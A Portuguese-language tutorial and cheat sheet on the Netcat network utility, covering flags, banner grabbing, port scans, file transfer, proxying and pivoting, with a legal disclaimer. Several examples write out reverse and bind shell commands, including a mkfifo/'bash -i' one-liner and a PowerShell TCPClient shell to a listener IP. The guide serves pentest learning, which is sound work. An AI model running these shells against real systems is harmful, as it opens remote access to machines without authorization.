Netcat

O canivete suíço TCP/IP — ligações, transferências, shells e bind/listen em qualquer porta

🔗 Site oficial 📖 Man page (OpenBSD nc) 📦 GitHub

O que é o Netcat?

O Netcat é um utilitário de rede que lê e escreve dados através de ligações TCP ou UDP — é frequentemente chamado de "canivete suíço do TCP/IP". Faz parte da suíte de ferramentas de rede há décadas e continua a ser usado por administradores, pentesters e investigadores de segurança pela sua simplicidade e versatilidade extrema .

Existem várias implementações: a original (GNU netcat), a OpenBSD nc (também conhecida por netcat-openbsd, que é a pré-instalada no Kali Linux), e o Ncat (parte do Nmap, com SSL, broker e mais funcionalidades). A sintaxe varia ligeiramente entre versões — este guia foca-se na OpenBSD nc usada no Kali, com notas sobre diferenças quando relevante .

Casos de uso clássicos : transferência de ficheiros entre máquinas sem SSH/FTP, banner grabbing para identificar serviços, port scanning rudimentar, shells reversas em pentest, listen em portas para testes, e troubleshooting de conectividade TCP/UDP .

Flags Essenciais

A sintaxe do Netcat é minimalista. Estas são as flags mais importantes na versão OpenBSD (Kali) :

FlagDescrição
-lModo listen — espera por ligações em vez de as iniciar
-p PORTPorta local (com -l) ou porta remota (sem -l)
-nSem resolução DNS — mais rápido e evita timeouts
-vVerbose — mostra mensagens de ligação
-vvVerbose duplo — ainda mais detalhes
-uModo UDP em vez de TCP
-zZero I/O — usado em port scanning (sem enviar dados)
-w SECSTimeout de ligação em segundos
-kManter o listen ativo após a ligação terminar (aceita múltiplas)
-e PROGExecutar programa (comum em shells reversas — variante GNU/tradicional)
-c CMDExecutar comando via /bin/sh (variante OpenBSD, substitui -e)
-q SECSSair após N segundos do EOF no stdin (variante OpenBSD)

Exemplos de Uso — do Básico ao Avançado

1. Ligação TCP simples (cliente)

Básico
nc 192.168.1.10 80

Liga à porta 80. Escreve um pedido HTTP manualmente para testar:

GET / HTTP/1.1 Host: 192.168.1.10 Connection: close

Termina com uma linha vazia. A resposta HTTP aparece no terminal .

2. Banner grabbing (identificar serviços)

Básico
nc -nv 192.168.1.10 22

Liga ao SSH. A resposta imediata revela a versão do servidor SSH (banner). Útil para fingerprinting rápido .

3. Port scan básico

Básico
nc -nvz 192.168.1.10 20-30

-z faz scan sem enviar dados, -n evita DNS, -v mostra resultado. O range 20-30 indica as portas a testar .

4. Port scan UDP

Básico
nc -nvzu 192.168.1.10 53,123,161

Scan UDP em portas específicas (DNS, NTP, SNMP). Menos fiável que TCP — o UDP não confirma sempre .

5. Listen numa porta (servidor simples)

Listen
nc -lvnp 4444

Fica à escuta na porta 4444. Qualquer cliente que se ligue pode trocar dados com o terminal .

6. Chat simples entre máquinas

Listen

Máquina A (servidor):

nc -lvnp 4444

Máquina B (cliente):

nc 192.168.1.20 4444

Tudo o que escreveres numa máquina aparece na outra. O Netcat não encripta — usa apenas em redes controladas .

7. Transferir ficheiro — recetor (listen)

Ficheiros
nc -lvnp 4444 > received.txt

O recetor fica à espera e guarda os dados em received.txt .

8. Transferir ficheiro — emissor (cliente)

Ficheiros
nc -nv 192.168.1.20 4444 < file.txt

Envia o conteúdo de file.txt para o recetor. Após o EOF, o Netcat fecha a ligação. Para ficheiros grandes, usa -q 0 na variante OpenBSD para sair imediatamente após EOF .

9. Transferir ficheiro em modo pull (recetor pede)

Ficheiros

Máquina A (servidor — envia):

nc -lvnp 4444 < file.txt

Máquina B (cliente — recebe):

nc -nv 192.168.1.20 4444 > received.txt

Nesta variante, o servidor envia e o cliente recebe. As duas variantes funcionam — escolhe conforme a direção da ligação .

10. Verificar se uma porta está aberta

Diagnóstico
nc -zv 192.168.1.10 443

Teste rápido de conectividade. Saída succeeded = aberta; Connection refused = fechada; silêncio ou timeout = filtrada .

11. Testar UDP (ex: DNS)

Diagnóstico
echo -n 'hello' | nc -u -w2 192.168.1.10 53

Envia um datagrama UDP cru. O timeout de 2s evita esperar indefinidamente. Útil para debugging de serviços UDP .

12. Shell reversa (Linux → Kali)

Shell reversa

Kali (listener):

nc -lvnp 4444

Alvo (Linux — com OpenBSD nc):

nc -nv 192.168.1.20 4444 -e /bin/bash

Na variante OpenBSD (que vem no Kali), a flag -e está normalmente desativada por segurança. Alternativas :

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.20 4444 > /tmp/f

Este one-liner funciona com qualquer versão do Netcat, usando um named pipe (FIFO) .

13. Shell reversa (Windows → Kali)

Shell reversa

Kali (listener):

nc -lvnp 4444

Windows (PowerShell):

powershell -c "$c=New-Object Net.Sockets.TCPClient('192.168.1.20',4444);..."

PowerShell é o método mais fiável em Windows moderno sem depender de binários externos .

14. Bind shell (alvo abre porta, Kali liga)

Shell reversa

Alvo (Linux):

nc -lvnp 4444 -e /bin/bash

Kali (cliente):

nc -nv 192.168.1.100 4444

Menos comum em pentest real (o alvo tem de aceitar ligações de entrada, normalmente bloqueadas por firewall) .

15. Ligação HTTP manual (GET/POST)

Truque
printf 'GET / HTTP/1.0\r\nHost: alvo.com\r\n\r\n' | nc -nv alvo.com 80

Faz um pedido HTTP manual. Útil para testar endpoints, enviar payloads crus ou depurar servidores .

16. Ver cabeçalhos SMTP

Truque
nc -nv mail.example.com 25

Interage manualmente com SMTP. Escreve EHLO test e QUIT para ver o banner e capacidades .

17. Fazer proxy TCP simples

Truque
mkfifo /tmp/pipe; nc -l -p 8080 < /tmp/pipe | nc 192.168.1.50 80 > /tmp/pipe

Encaminha tráfego local da porta 8080 para 192.168.1.50:80. Útil para contornar restrições de rede ou fazer pivot .

18. Manter listen ativo (múltiplas ligações)

Truque
nc -k -lvnp 4444

-k mantém o listener à espera depois de uma ligação terminar — aceita múltiplas conexões em série .

Netcat vs. Ncat vs. Socat

Escolher a ferramenta certa para cada caso :

FerramentaVantagensDesvantagens
Netcat (OpenBSD nc) Minimalista, pré-instalado, funciona em tudo Sem SSL, sem broker, -e normalmente desativado
Ncat (Nmap) SSL/TLS, broker, --allow, IPv6, mantido ativamente Menos leve, sintaxe diferente
Socat Extremamente flexível, múltiplos protocolos Sintaxe complexa, curva de aprendizagem

Cheat Sheet rápido

nc -lvnp 4444 Listen em todas as interfaces
nc -nv 192.168.1.10 80 Ligação TCP simples
nc -zv 192.168.1.10 22 Verificar porta aberta
nc -nvz 10.0.0.1 20-30 Port scan de range
nc -u -w2 10.0.0.1 53 UDP com timeout
nc -l 4444 > file Receber ficheiro
nc 10.0.0.1 4444 < file Enviar ficheiro
nc -k -lvnp 4444 Listen persistente
💡 Dica: O Netcat não encripta — tudo passa em texto claro pela rede. Em ambientes hostis, usa Ncat com --ssl ou socat com OPENSSL. Além disso, shells reversas com -e /bin/bash não têm TTY: comandos como su, sudo ou editores interativos (vim, nano) falham. Para uma shell interativa completa, faz upgrade com Python PTY: python3 -c 'import pty; pty.spawn("/bin/bash")' .
⚠️ Aviso legal: O Netcat é uma ferramenta de duplo uso. Usar shells reversas, fazer scan ou transferir dados de sistemas que não possuis ou para os quais não tens autorização explícita é ilegal. Em contexto defensivo, listeners Netcat abertos em redes corporativas são um sinal de alerta — a ferramenta é frequentemente abusada por atacantes após comprometer um host. Usa exclusivamente em sistemas próprios, laboratórios controlados ou engajamentos com scope escrito .
